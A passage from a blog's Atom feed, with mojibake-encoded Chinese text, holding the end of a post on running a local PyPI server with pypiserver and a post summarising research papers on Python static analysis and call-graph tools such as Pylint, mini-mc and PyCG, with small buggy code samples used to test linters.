~/packages</span><br></pre></td></tr></table></figure><p>è¿è¡ŒæœåŠ¡å™¨ï¼Œç«¯å£æŒ‡å®šä¸º <code>8080</code>ï¼Œ é»˜è®¤ç›‘å¬æ‰€æœ‰ IP åœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypi-server -p 8080 ~/packages &amp;</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>æœç´¢æœ¬åœ°æœåŠ¡å™¨ä¸Šæ˜¯å¦æœ‰ <code>my_project</code> åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip search --index http://localhost:8080 my_project</span><br></pre></td></tr></table></figure><p>å®‰è£…å’Œä½¿ç”¨ <code>my_project</code> åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --extra-index-url http://localhost:8080 my_project</span><br></pre></td></tr></table></figure><script id="asciicast-PTCdzI2ZPbmelUTBpgcS8kVHA" src="https://asciinema.org/a/PTCdzI2ZPbmelUTBpgcS8kVHA.js" async></script><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://pythonguidecn.readthedocs.io/zh/latest/writing/structure.html">ç»“æ„åŒ–æ‚¨çš„å·¥ç¨‹</a></li><li><a href="https://packaging.python.org/tutorials/packaging-projects/">Packaging Python Projects</a></li><li><a href="https://packaging.python.org/guides/distributing-packages-using-setuptools/">Packaging and distributing projects</a></li><li><a href="https://choosealicense.com/">Choose a License</a></li><li><a href="https://docs.python.org/zh-cn/3/library/index.html">Python æ ‡å‡†åº“</a></li><li><a href="https://testerhome.com/articles/27052">æµ‹è¯•å¼€å‘æŠ€æœ¯ å®æˆ˜æ•™ç¨‹ï¼šå¦‚ä½•å°†è‡ªå·±çš„ Python åŒ…å‘å¸ƒåˆ° PyPI ä¸Š</a></li><li><a href="https://github.com/kennethreitz/setup.py/blob/master/setup.py">kennethreitz/setup.py</a></li><li><a href="https://www.jianshu.com/p/c260b59cd3d0">åŸºäº pypiserver çš„ PyPI ç§æœ‰ä»“åº“æ­å»ºå®è·µ</a></li><li><a href="https://github.com/pypiserver/pypiserver">pypiserver/pypiserver</a></li></ul>]]></content>
    
    
    <summary type="html">ä½¿ç”¨ pypiserver æ­å»ºæœ¬åœ°æœåŠ¡å™¨</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python é™æ€åˆ†æç›¸å…³è®ºæ–‡</title>
    <link href="https://jckling.github.io/2021/07/28/Notes/Python%20%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/"/>
    <id>https://jckling.github.io/2021/07/28/Notes/Python%20%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/</id>
    <published>2021-07-28T11:01:13.000Z</published>
    <updated>2022-03-08T09:03:12.286Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¿»äº†å‡ ç¯‡ Python é™æ€åˆ†æç›¸å…³çš„è®ºæ–‡ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆæ¯”è¾ƒå¥½çš„åˆ†æå·¥å…·ã€‚</p><h2 id="é™æ€åˆ†æå·¥å…·"><a href="#é™æ€åˆ†æå·¥å…·" class="headerlink" title="é™æ€åˆ†æå·¥å…·"></a>é™æ€åˆ†æå·¥å…·</h2><h3 id="1-Survey-on-Static-Analysis-Tools-of-Python-Programs"><a href="#1-Survey-on-Static-Analysis-Tools-of-Python-Programs" class="headerlink" title="1. Survey on Static Analysis Tools of Python Programs"></a>1. Survey on Static Analysis Tools of Python Programs</h3><blockquote><p>SQAMIA 2019</p></blockquote><p>æ¦‚è¿°äº† Python ä»£ç åº“é™æ€åˆ†æçš„ç°æœ‰æ–¹æ³•å’Œå·¥å…·ï¼Œå¹¶ä»‹ç»äº†ä¸€äº›æ–°çš„ç ”ç©¶æ–¹å‘ã€‚</p><p>æ€»ç»“äº†å¸¸è§çš„ Python é™æ€åˆ†æå·¥å…·ä¹‹é—´çš„å…³ç³»ï¼Œç®€å•ä»‹ç»äº†ï¼ˆå‡ è¡Œæ¦‚è¿°ï¼‰ <a href="https://github.com/PyCQA/pylint">Pylint</a>ã€<a href="https://github.com/PyCQA/pyflakes">Pyflakes</a>ã€<a href="https://github.com/PyCQA/flake8">flake8</a>ã€<a href="https://github.com/timothycrosley/deprecated.frosted">Frosted</a>ã€<a href="https://github.com/PyCQA/pycodestyle">Pycodestyle</a>ã€<a href="https://github.com/python/mypy">Mypy</a>ã€<a href="https://github.com/bjodah/pysym">PySym</a>ã€<a href="https://github.com/thomasjball/PyExZ3">PyExZ3</a>ã€‚</p><img src="https://i.loli.net/2021/07/29/qpvM1iYNFXhLgTe.jpg" style="zoom:70%;" /><p>è®¾è®¡å¹¶æµ‹è¯•äº† 6 ç§å…¸å‹çš„é€»è¾‘æ¼æ´ï¼ˆlogical errorsï¼‰ï¼Œç”¨ PyLintã€Pyflakesã€Flake8ã€Mypyã€Frosted æ£€æµ‹</p><ul><li>ä½¿ç”¨é»˜è®¤é…ç½®</li><li>é€»è¾‘é”™è¯¯ä¼šäº§ç”Ÿæ„å¤–çš„è¾“å‡ºæˆ–ç»“æœï¼Œä½†ä¸ä¸€å®šä¼šå¯¼è‡´å´©æºƒ</li></ul><img src="https://i.loli.net/2021/07/29/G1Q8ETPtCyKoSxA.png" style="zoom:70%;" /><ol><li><p>å¼•ç”¨æœªå®šä¹‰å˜é‡</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">message = <span class="string">&quot;Hello there!&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;greetMe&quot;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">print(mesage) <span class="comment"># å˜é‡åæ‰“é”™</span></span><br><span class="line">print(<span class="string">&quot;This code is fine, no problems.&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>å¤ªå¤šä½ç½®å‚æ•°</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys <span class="comment"># æœªä½¿ç”¨çš„å¯¼å…¥</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, first_name, last_name, age</span>):</span></span><br><span class="line">        self.first_name = first_name</span><br><span class="line">        self.last_name = last_name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Windows&quot;</span> <span class="keyword">in</span> platform.platform(): <span class="comment"># æœªå®šä¹‰çš„ platform å˜é‡</span></span><br><span class="line">    print(<span class="string">&quot;Youâ€™ re using Windows !&quot;</span>)</span><br><span class="line"></span><br><span class="line">    self.age = self.getAge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment"># å¤ªå¤šä½ç½®å‚æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getAge</span>(<span class="params">this</span>):</span> <span class="comment"># æ²¡æœ‰ self å‚æ•°</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;18&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>ä¼ é€’ç±»å‹é”™è¯¯çš„å‚æ•°</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">x:<span class="built_in">int</span>, y:<span class="built_in">int</span></span>):</span> <span class="comment"># ç±»å‹æ³¨é‡Š</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line">print(<span class="built_in">sum</span>(<span class="number">3</span>, <span class="number">4</span>))</span><br><span class="line">print(<span class="built_in">sum</span>(<span class="number">3</span>, <span class="string">&quot;4&quot;</span>)) <span class="comment"># ä¼ é€’é”™è¯¯ç±»å‹çš„å‚æ•°</span></span><br></pre></td></tr></table></figure></li><li><p>å¼•ç”¨ä¸å­˜åœ¨çš„ç±»å±æ€§</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">PERSON1 = Person(<span class="string">&quot;Hristina&quot;</span>, <span class="number">23</span>)</span><br><span class="line">print(PERSON1.age)</span><br><span class="line">print(PERSON1.height) <span class="comment"># å¼•ç”¨ä¸å­˜åœ¨çš„å±æ€§</span></span><br></pre></td></tr></table></figure></li><li><p>è°ƒç”¨åµŒå¥—å‡½æ•°</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    x=<span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        print(x)</span><br><span class="line">    inner()</span><br><span class="line">outer()</span><br><span class="line">inner() <span class="comment"># è°ƒç”¨ outer å†…éƒ¨å®šä¹‰çš„å‡½æ•°</span></span><br></pre></td></tr></table></figure></li><li><p>é—­åŒ…é”™è¯¯</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é—­åŒ…</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    x = <span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        y = <span class="number">3</span></span><br><span class="line">        result = x + y</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line">a = outer()</span><br><span class="line">print(a()) <span class="comment"># è°ƒç”¨ inner()</span></span><br><span class="line">print(a.__name__) <span class="comment"># æ‰“å° inner</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é—­åŒ…é”™è¯¯ï¼Œéé¢„æœŸç»“æœ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet</span>(<span class="params">greet_word, name</span>) :</span></span><br><span class="line">print(greet_word, name)</span><br><span class="line">greeters = <span class="built_in">list</span>()</span><br><span class="line">names = [<span class="string">&quot;Kiki&quot;</span>, <span class="string">&quot;Riki&quot;</span>, <span class="string">&quot;Joe&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">greeters.append(<span class="keyword">lambda</span> x : greet(x, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> greeter <span class="keyword">in</span> greeters:</span><br><span class="line">greeter(<span class="string">&quot;Hi&quot;</span>)</span><br><span class="line"><span class="comment"># æ‰“å°</span></span><br><span class="line"><span class="comment"># Hi Joe</span></span><br><span class="line"><span class="comment"># Hi Joe</span></span><br><span class="line"><span class="comment"># Hi Joe</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-Towards-More-Sophisticated-Static-Analysis-Methods-of-Python-Programs"><a href="#2-Towards-More-Sophisticated-Static-Analysis-Methods-of-Python-Programs" class="headerlink" title="2. Towards More Sophisticated Static Analysis Methods of Python Programs"></a>2. Towards More Sophisticated Static Analysis Methods of Python Programs</h3><blockquote><p>Informatics 2019 â€¢ IEEE 15th International Scientific Conference on Informatics</p></blockquote><p>å’Œä¸Šä¸€ç¯‡åŒæ ·çš„ä½œè€…ï¼Œæ¢è®¨äº†ä¸º Python å¼€å‘æ›´å¼ºå¤§çš„é™æ€åˆ†æå·¥å…·çš„å¯èƒ½ç ”ç©¶æ–¹å‘ã€‚</p><p>æ€»ç»“ç°æœ‰çš„é™æ€åˆ†ææ–¹æ³•ï¼šæ¨¡å¼åŒ¹é…ã€AST åŒ¹é…ã€ç¬¦å·æ‰§è¡Œã€æ··åˆæ‰§è¡Œã€‚å¯¹æ¯”åŸºäº AST çš„ Pylint å’Œå®éªŒæ€§çš„ç¬¦å·æ‰§è¡Œå·¥å…· mini-mcï¼ˆä½¿ç”¨ Z3 çº¦æŸæ±‚è§£å™¨çš„ Python æ¥å£ï¼‰</p><ul><li>4 ä¸ªä»£ç ç‰‡æ®µæµ‹è¯• mini-mc çš„æ£€æµ‹èƒ½åŠ›ï¼Œå…¶ä¸­ 2 ä¸ªç‰‡æ®µç”¨äºæ¯”è¾ƒ</li></ul><table><thead><tr><th></th><th>Pylint</th><th>mini-mc</th></tr></thead><tbody><tr><td>å¼•ç”¨æœªå®šä¹‰å˜é‡</td><td>x</td><td>âˆš</td></tr><tr><td>å¯èƒ½çš„é™¤é›¶å¼‚å¸¸ï¼ˆè¯¯æŠ¥ï¼‰</td><td>x</td><td>âˆš</td></tr></tbody></table><ol><li><p>å¼•ç”¨æœªå®šä¹‰å˜é‡</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">arg</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>== arg):</span><br><span class="line">        print(<span class="string">&quot;branch11 &quot;</span>, os.getpid())</span><br><span class="line">        z = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>!=arg):</span><br><span class="line">        print(<span class="string">&quot;branch21 &quot;</span>, os.getpid())</span><br><span class="line">        x = z</span><br><span class="line"></span><br><span class="line">arg = BitVec(arg, <span class="number">32</span>)</span><br><span class="line">func(arg)</span><br></pre></td></tr></table></figure></li><li><p>å¯èƒ½çš„é™¤é›¶å¼‚å¸¸</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">arg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> arg == <span class="number">41</span> :</span><br><span class="line">    print(<span class="string">&quot;branch21 &quot;</span>, os.getpid())</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># è¾“å…¥ä¸º 42 æ—¶ç¡®å®ä¼šå¼•èµ·å¼‚å¸¸ï¼Œä½†å…¶ä»–æƒ…å†µä¸‹æ²¡æœ‰é—®é¢˜</span></span><br><span class="line">        print(<span class="string">&quot;branch22 &quot;</span>, os.getpid())</span><br><span class="line">        z = arg - <span class="number">42</span></span><br><span class="line">        z = <span class="number">99</span> / z</span><br></pre></td></tr></table></figure></li></ol><h3 id="3-Static-Value-Analysis-of-Python-Programs-by-Abstract-Interpretation"><a href="#3-Static-Value-Analysis-of-Python-Programs-by-Abstract-Interpretation" class="headerlink" title="3. Static Value Analysis of Python Programs by Abstract Interpretation"></a>3. Static Value Analysis of Python Programs by Abstract Interpretation</h3><blockquote><p>NASA Formal Methods Symposium</p></blockquote><p>é€šè¿‡ <strong>æŠ½è±¡è§£é‡Š</strong> æ¨æ–­å˜é‡ç±»å‹ã€è¿è¡Œæ—¶é”™è¯¯å’Œæœªæ•è·å¼‚å¸¸ï¼Œåªæ”¯æŒä¸€å°éƒ¨åˆ†å†…ç½®å¯¹è±¡å’Œæ ‡å‡†åº“çš„åˆ†æã€‚</p><h2 id="è°ƒç”¨å›¾å·¥å…·"><a href="#è°ƒç”¨å›¾å·¥å…·" class="headerlink" title="è°ƒç”¨å›¾å·¥å…·"></a>è°ƒç”¨å›¾å·¥å…·</h2><h3 id="1-Empirical-Study-of-Python-Call-Graph"><a href="#1-Empirical-Study-of-Python-Call-Graph" class="headerlink" title="1. Empirical Study of Python Call Graph"></a>1. Empirical Study of Python Call Graph</h3><blockquote><p>2019 34th IEEE/ACM International Conference on Automated Software Engineering (ASE)</p></blockquote><p>å¯¹ç°æœ‰çš„ Python ç¨‹åºè°ƒç”¨å›¾ç”Ÿæˆå·¥å…·è¿›è¡Œæ¯”å¯¹ï¼ˆ<a href="https://github.com/davidfraser/pyan">Pyan</a>ã€<a href="https://github.com/scottrogowski/code2flow">Code2flow</a>ã€<a href="https://github.com/gak/pycallgraph">Pycallgraph</a>ã€Understandï¼‰ï¼Œä»¥ Pycallgraph ä½œä¸ºåŸºå‡†ï¼Œç”¨å¸¸è§çš„æ¨¡å—æºä»£ç è¿›è¡Œæµ‹è¯•ï¼ˆscikit-learnã€theanoã€networkxã€numbaã€joblibã€pandasï¼‰</p><ul><li>Pyanã€Code2flowã€Pycallgraphï¼ˆ6 å¹´å‰åœæ›´ï¼‰ï¼šGithub å¼€æºå·¥å…·</li><li>Understandï¼šå•†ä¸šè½¯ä»¶</li></ul><p>é’ˆå¯¹ pandas æ¨¡å—ï¼Œå„ä¸ªå·¥å…·ç”Ÿæˆçš„éšå¼èŠ‚ç‚¹æ•°ç›®æœ‰æ‰€ä¸åŒï¼Œè¿™é€ æˆäº†ç»“æœçš„å·¨å¤§å·®å¼‚ã€‚</p><img src="https://i.loli.net/2021/07/29/nzaZEiHlMJWAuwc.jpg" style="zoom:70%;" /><p>ç»“è®ºï¼šç°æœ‰çš„ Python é™æ€è°ƒç”¨å›¾å·¥å…·åœ¨æ„å»ºæ•ˆæœä¸Šå­˜åœ¨è¾ƒå¤§å·®å¼‚ï¼Œä»æœ‰æ”¹è¿›çš„ç©ºé—´ã€‚</p><h3 id="2-PyCG-Practical-Call-Graph-Generation-in-Python"><a href="#2-PyCG-Practical-Call-Graph-Generation-in-Python" class="headerlink" title="2. PyCG: Practical Call Graph Generation in Python"></a>2. PyCG: Practical Call Graph Generation in Python</h3><blockquote><p>2021 IEEE/ACM 43rd International Conference on Software Engineering (ICSE)</p></blockquote><p>æå‡ºäº†ä¸€ç§å®ç”¨çš„ã€é™æ€çš„ Python è°ƒç”¨å›¾ç”Ÿæˆæ–¹æ³•ã€‚æ¶‰åŠä¸Šä¸‹æ–‡æ•æ„Ÿçš„è¿‡ç¨‹é—´åˆ†æï¼Œä¸åŠ¨ç‚¹è¿­ä»£ç®—æ³•ç­‰ã€‚æ²¡æœ‰åˆ†æå¾ªç¯å’Œæ¡ä»¶è¯­å¥ï¼Œä¹Ÿä¸ä½¿ç”¨å˜é‡ç±»å‹ä¿¡æ¯ï¼Œåªèƒ½åˆ†ææœ‰æºç çš„æ¨¡å—ã€‚</p><p>ç¼–å†™å¦‚ä¸‹ crypto æ¨¡å—è¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cryptops</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apply</span>(<span class="params">self, msg, func</span>):</span></span><br><span class="line"><span class="keyword">return</span> func(self.key, msg)</span><br><span class="line"></span><br><span class="line">crp = Crypto(<span class="string">&quot;secretkey&quot;</span>)</span><br><span class="line">encrypted = crp.apply(<span class="string">&quot;hello world&quot;</span>, cryptops.encrypt)</span><br><span class="line">decrypted = crp.apply(encrypted, cryptops.decrypt)</span><br></pre></td></tr></table></figure><p>(a) æ˜¯å®é™…çš„è°ƒç”¨å›¾ï¼ˆäººå·¥ç»˜åˆ¶ï¼‰ï¼Œ(b) Pyan æ²¡æœ‰è¿›è¡Œè¿‡ç¨‹é—´åˆ†æï¼Œ(c) Depends çš„ç­–ç•¥éå¸¸ä¿å®ˆï¼Œåªæœ‰é¢„æœŸä¿¡æ¯è¶³å¤Ÿæ‰ç”Ÿæˆè°ƒç”¨è¾¹</p><img src="https://i.loli.net/2021/07/29/eoSfyqKCXFDuZwh.jpg" style="zoom:70%;" /><p>ä½¿ç”¨ PyCG åˆ†æ crypto æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ°å®Œæ•´ä¸”æ­£ç¡®çš„åç§°è§£æå’Œè°ƒç”¨</p><ul><li>æ©™è‰²ï¼šæ¨¡å—</li><li>çº¢è‰²ï¼šç±»</li><li>é»‘è‰²ï¼šå‡½æ•°</li><li>è“è‰²ï¼šå˜é‡</li></ul><img src="https://i.loli.net/2021/07/29/O7IoGZtEjwXup3A.jpg" style="zoom:70%;" /><p>å¾®è§‚åŸºå‡†æµ‹è¯•å¥—ä»¶ï¼ˆMicro-benchmark Suiteï¼‰åŒ…å« 112 ä¸ªç‹¬ç‰¹çš„å°å‹ä»£ç ï¼Œæ¶µç›– Python è¯­è¨€çš„å„ç§ç‰¹æ€§ï¼Œåˆ†ä¸º 16 ä¸ªç±»åˆ«ã€‚</p><img src="https://i.loli.net/2021/07/29/pnfacBJVRN3TISA.jpg" style="zoom:70%;" /><p>å®è§‚åŸºå‡†æµ‹è¯•ï¼ˆMacro-benchmarksï¼‰ä½¿ç”¨ 5 ä¸ªæµè¡Œçš„å¼€æº Python è½¯ä»¶ï¼Œå¹³å‡ç”¨äº† 10h ä¸ºæ¯ä¸ªé¡¹ç›®ç”Ÿæˆè°ƒç”¨å›¾</p><img src="https://i.loli.net/2021/07/29/Sqnl6K27FUxhcPk.jpg" style="zoom:70%;" /><p>PyCG å’Œ Pyan å¯¹æ¯”ï¼ŒPyCG åŸºæœ¬ä¸ºæ‰€æœ‰ä»£ç ç”Ÿæˆäº†å®Œæ•´çš„è°ƒç”¨å›¾ï¼ˆ111/112ï¼‰ï¼ŒSound åªè¦†ç›–äº† 103 æ˜¯å› ä¸ºæ²¡æœ‰è¦†ç›– Python çš„æ˜Ÿå·èµ‹å€¼ï¼›Pyan æ•´ä½“æ¯”è¾ƒæ®‹å¿µï¼Œåœ¨èµ‹å€¼ç›¸å…³çš„æµ‹è¯•ä¸­è¡¨ç°è‰¯å¥½ã€‚</p><img src="https://i.loli.net/2021/07/29/tq5ijGV2YyULTNP.jpg" style="zoom:70%;" /><p>è¿™é‡Œçš„ complete å’Œ sound æ˜¯é™æ€åˆ†æä¸­çš„æ¦‚å¿µï¼š</p><img src="https://i.loli.net/2021/07/29/MbHyi6CXpPJ4aTq.jpg" style="zoom:50%;" /><p>PyCG å’Œ Pyanã€Depends å¯¹æ¯”ï¼Œåœ¨çœŸå®çš„ Python é¡¹ç›®ä¸Šï¼ŒPyCG èƒ½å¤Ÿç”Ÿæˆé«˜ç²¾åº¦çš„è°ƒç”¨å›¾ï¼ŒRecall å€¼è¾ƒä½æ˜¯å› ä¸ºæ–¹æ³•çš„å±€é™å’Œç¼ºä¹å¯¹ Python æŸäº›åŠŸèƒ½ç‰¹æ€§çš„æ”¯æŒã€‚</p><p>å¦å¤–è¿˜æ¯”è¾ƒäº†ä¸€ä¸‹æ—¶é—´å’Œå†…å­˜çš„æ¶ˆè€—ï¼ˆå– 20 æ¬¡çš„å¹³å‡å€¼ï¼‰</p><img src="https://i.loli.net/2021/07/29/4jBnk5lyiJxMouS.jpg" style="zoom:70%;" /><h3 id="3-Qualitative-and-Quantitative-Analysis-of-Callgraph-Algorithms-for-Python"><a href="#3-Qualitative-and-Quantitative-Analysis-of-Callgraph-Algorithms-for-Python" class="headerlink" title="3. Qualitative and Quantitative Analysis of Callgraph Algorithms for Python"></a>3. Qualitative and Quantitative Analysis of Callgraph Algorithms for Python</h3><blockquote><p>2021 International Conference on Code Quality (ICCQ)</p></blockquote><p>æå‡ºäº†ä¸€ä¸ªå¯æ‰©å±•çš„ Python è°ƒç”¨å›¾æ¯”è¾ƒåˆ†ææ¡†æ¶ eval_CGï¼ŒåŒ…å«å¾®è§‚æµ‹è¯•å’Œå®è§‚æµ‹è¯•</p><ul><li>å¾®è§‚æµ‹è¯•ï¼š49 ä¸ªå°å‹ä»£ç ï¼Œåˆ†ä¸º 13ç±»</li><li>å®è§‚æµ‹è¯•ï¼š5 ä¸ªå¼€æº Python é¡¹ç›®ï¼ŒPython roboticsã€mitmproxyã€cookiecutterã€YouCompleteMeã€The Fuck</li></ul><p>å¯¹ä¸åŒçš„è°ƒç”¨å›¾æ„é€ å·¥å…·è¿›è¡Œç³»ç»Ÿçš„æ¯”è¾ƒ</p><ul><li>é™æ€è°ƒç”¨å›¾ï¼ˆCode2flowã€Pyanã€WALAï¼‰</li><li>åŠ¨æ€è°ƒç”¨å›¾ï¼ˆPyCallGraphï¼‰é€šè¿‡åŠ¨æ€åˆ†ææ‰§è¡Œè·¯å¾„ç”Ÿæˆ Python è°ƒç”¨å›¾ï¼Œè¿™ç§åˆ†æåº”è¯¥ç”¨å¦ä¸€ç§æ–¹æ³•ï¼ˆä¾‹å¦‚æ¨¡ç³Šæµ‹è¯•ï¼‰æ¥è·å¾—æœ‰æ„ä¹‰çš„ç»“æœï¼Œå¦åˆ™ä¼šäº§ç”Ÿè®¸å¤šè¯¯æŠ¥</li></ul><p>ç»“è®ºï¼šè¿™äº›å·¥å…·ç”Ÿæˆçš„é™æ€è°ƒç”¨å›¾éƒ½åŒ…å«è™šå‡è¾¹ï¼Œè€Œä¸”éƒ½æ²¡æœ‰ç”Ÿæˆ sound çš„è°ƒç”¨å›¾ï¼ˆæ²¡æœ‰æ¼æŠ¥ï¼‰</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>æ•´ç†äº†å‡ ä¸ªå¯ä»¥ç”¨äºç”Ÿæˆè°ƒç”¨å›¾çš„å·¥å…·ï¼Œä¹‹åè¯•è¯•çœ‹ï¼š</p><ul><li><a href="https://github.com/davidfraser/pyan">Pyan3</a></li><li><a href="https://github.com/vitsalis/pycg">PyCG</a></li><li><a href="https://github.com/scottrogowski/code2flow">Code2flow</a></li><li><a href="https://pyre-check.org/docs/querying-pyre/#dump-call-graph">Pyre - Dump call graph</a></li></ul>]]></content>
    
    
    <summary type="html">æ¦‚è§ˆ</summary>
    
    
    
    <category term="Notes" scheme="https://jckling.github.io/categories/Notes/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Butterfly ä¸»é¢˜é¢„è§ˆ</title>
    <link href="https://jckling.github.io/2021/07/22/Other/Butterfly%20%E4%B8%BB%E9%A2%98%E9%A2%84%E8%A7%88/"/>
    <id>https://jckling.github.io/2021/07/22/Other/Butterfly%20%E4%B8%BB%E9%A2%98%E9%A2%84%E8%A7%88/</id>
    <published>2021-07-22T09:02:46.000Z</published>
    <updated>2021-11-12T02:32:41.000Z</updated>
    
